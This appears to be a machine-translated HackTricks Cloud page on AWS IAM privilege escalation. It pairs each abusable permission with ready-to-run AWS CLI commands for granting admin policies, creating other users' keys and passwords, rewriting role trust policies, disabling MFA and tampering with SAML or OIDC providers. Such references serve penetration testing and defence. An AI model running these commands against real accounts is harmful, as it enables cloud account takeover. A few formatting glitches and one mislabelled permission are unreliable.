# AWS - IAM Privesc

<details>

<summary><strong>从零到英雄学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## IAM

有关IAM的更多信息，请查看：

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

拥有 **`iam:CreatePolicyVersion`** 权限的攻击者可以创建他们有权访问的IAM策略的**新版本**。这允许他们定义他们**自己的自定义权限**。创建新的策略版本时，需要将其**设置为默认版本才能生效**，你可能会认为这需要`iam:SetDefaultPolicyVersion`权限，但在创建新的策略版本时，可以包含一个标志（**`--set-as-default`**），这将自动将其创建为**新的默认版本**。使用该标志**不**需要`iam:SetDefaultPolicyVersion`权限。

利用这种方法的示例命令可能如下所示：
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
在 `policy.json` 文件中将包含一个**策略文档，允许对账户中的任何资源执行任何操作**。

**潜在影响：** 直接提升权限至所有内容。

### `iam:SetDefaultPolicyVersion`

拥有 **`iam:SetDefaultPolicyVersion`** 权限的攻击者可能能够通过**当前未使用的现有策略版本**提升权限。如果攻击者可以访问的**策略**有**非默认**的版本，他们可以将默认版本更改为任何其他现有版本。

{% hint style="warning" %}
如果您正在**修改**版本的**策略**与授予攻击者 `SetDefaultPolicyVersion` 权限的策略相同，且**新版本不授予**该权限，攻击者**将无法将策略恢复到原始状态**。
{% endhint %}

利用这种方法的示例命令可能如下所示：
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
其中“v2”是具有最多权限的策略版本。

**潜在影响：**通过设置不同的策略版本间接提升权限，这可能授予更多权限。

### `iam:CreateAccessKey`

拥有对其他用户的 **`iam:CreateAccessKey`** 权限的攻击者可以**创建属于另一用户的访问密钥 ID 和密钥访问密钥**，如果他们还没有两组关联的密钥（最佳实践建议不应该有）。

利用这种方法的示例命令可能如下所示：
```bash
aws iam create-access-key --user-name <target_user>
```
目标用户与当前用户相比拥有更广泛的权限集。

**潜在影响：** 直接提升至任何用户的权限。

### `iam:CreateLoginProfile`

攻击者如果对其他用户拥有 `iam:CreateLoginProfile` 权限，可以为**任何尚未设置登录配置文件的用户**创建密码，以便**登录** AWS 控制台。

利用这种方法的示例命令可能如下所示：
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
该密码保证将满足**账户最低密码要求**。

**潜在影响：** 直接提升权限至“任何”用户。

### `iam:UpdateLoginProfile`

拥有对其他用户的 **`iam:UpdateLoginProfile`** 权限的攻击者可以**更改用于登录 AWS 控制台的密码**，前提是该用户**已经设置了登录配置文件**。

像创建登录配置文件一样，利用这种方法的示例命令可能如下所示：
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
该密码保证将满足**账户最低密码要求**。

**潜在影响：** 直接提升“任何”用户的权限。

### `iam:UpdateAccessKey`

拥有 **`iam:UpdateAccessKey`** 权限的攻击者可以**启用被禁用的访问密钥**并使用它（他需要拥有被禁用的访问密钥）

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**潜在影响：** 直接提升权限以访问拥有密钥的用户（需要拥有该密钥）。

### `iam:CreateServiceSpecificCredential`

它允许**生成**一个**用户名**和**密码**，这些可以用来**访问请求中指定的服务**（**CodeCommit 或 Amazon Keyspaces** -- Apache Cassandra--）。

新的特定服务凭证拥有与关联用户**相同的权限**，除了它们只能用来访问指定的服务。

每个支持的服务每个用户最多只能拥有**两组特定服务的凭证**。

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
**潜在影响：** 直接提升至用户服务权限。

### `iam:ResetServiceSpecificCredential`

类似于 **`iam:CreateServiceSpecificCredential`**，但不是创建新的凭证，而是重置一个。&#x20;

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
```markdown
{% endcode %}

**潜在影响：** 直接提升至用户服务权限。

### `iam:AttachUserPolicy`

拥有 **`iam:AttachUserPolicy`** 权限的攻击者可以通过**将策略附加到他们可以访问的用户**来提升权限，将该策略的权限添加到攻击者身上。

利用这种方法的示例命令可能如下所示：
```
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**潜在影响：** 直接提升至任何权限。

### `iam:AttachGroupPolicy`

拥有 **`iam:AttachGroupPolicy`** 权限的攻击者可以通过**将策略附加到他们所在的组**来提升权限，将该策略的权限添加给攻击者。
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Where the group is a group the current user is a part of.

**潜在影响：** 如果用户在某个组内，可能直接提升至任何权限。

### `iam:AttachRolePolicy`, ( `sts:AssumeRole`|`iam:createrole`)

拥有 **`iam:AttachRolePolicy`** 权限的攻击者可以通过**将策略附加到角色**来提升权限，该角色是攻击者可以访问的，从而将该策略的权限添加给攻击者。
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
```markdown
其中角色是当前用户可以使用 `sts:AssumeRole` 临时扮演的角色。

**潜在影响：** 直接提升至任何权限。

### `iam:PutUserPolicy`

拥有 `iam:PutUserPolicy` 权限的攻击者可以**通过为他们可以访问的用户创建或更新内联策略来提升权限**，将该策略的权限添加给攻击者。
```
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
您可以使用类似的策略：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**潜在影响：** 直接提升至任何权限。

### `iam:PutGroupPolicy`

拥有 `iam:PutGroupPolicy` 权限的攻击者可以通过**为他们所在的组创建或更新内联策略**，将该策略的权限添加给攻击者，从而提升权限。
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

拥有 **`iam:PutRolePolicy`** 权限的攻击者可以通过**为他们可以访问的角色创建或更新内联策略**，将该策略的权限添加给攻击者，从而提升权限。

利用这种方法的示例命令可能如下所示：
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
```markdown
其中角色是当前用户可以使用 `sts:AssumeRole` 暂时扮演的角色。

**潜在影响：** 直接提升权限至任何事物。

### `iam:AddUserToGroup`

拥有 **`iam:AddUserToGroup`** 权限的攻击者可以利用它将自己**添加到 AWS 账户中的现有 IAM 组**。
```
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
**目标组拥有比攻击者用户账户更多/不同的权限。**

**潜在影响：** 直接提升到任何组的权限。

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

拥有 `iam:UpdateAssumeRolePolicy` 和 `sts:AssumeRole` 权限的攻击者将能够**更改任何现有角色的扮演角色策略文档**，以允许他们扮演该角色。
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
```markdown
当策略如下所示，它授予用户权限以扮演角色：
```
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**潜在影响：** 直接提升权限至任何角色。

### `iam:UploadSSHPublicKey`

拥有 `iam:DeactivateMFADevice` 权限的攻击者可以上传一个**SSH公钥并将其与指定的IAM用户关联**([了解更多](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html))。

通过此操作上传的SSH公钥只能用于**验证关联的IAM用户以访问CodeCommit仓库**。有关使用SSH密钥进行认证以访问CodeCommit仓库的更多信息，请参阅_CodeCommit用户指南_中的[为SSH连接设置CodeCommit](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html)。
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**潜在影响：** 间接提升至CodeCommit权限。

### `iam:DeactivateMFADevice`

拥有`iam:DeactivateMFADevice`权限的攻击者可以**停用指定的MFA设备**并解除其与最初启用该设备的IAM用户的关联（[了解更多](https://docs.aws.amazon.com/IAM/latest/APIReference/API_DeactivateMFADevice.html)）。
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**潜在影响：** 如果您已知其用户名和密码，通过禁用MFA设备间接提升用户权限。

### `iam:ResyncMFADevice`

拥有`iam:ResyncMFADevice`权限的攻击者可以**同步指定的MFA**设备与IAM实体：用户或角色（[了解更多](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)）。
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**潜在影响：** 如果您已经知道他的用户名和密码，可以通过添加MFA设备间接提升用户权限。

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

拥有这些权限，您可以**更改SAML连接的XML元数据**。然后，您可以滥用**SAML联合认证**，以任何**信任它的角色**身份**登录**。

请注意，这样做**合法用户将无法登录**。然而，您可以获取XML，这样您就可以放置您的XML，登录并配置回之前的设置。
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
待办事项：一个能够生成SAML元数据并使用指定角色登录的工具
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

（不确定）如果攻击者拥有这些**权限**，他可以添加一个新的**Thumbprint**，以便登录所有信任该提供者的角色。

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
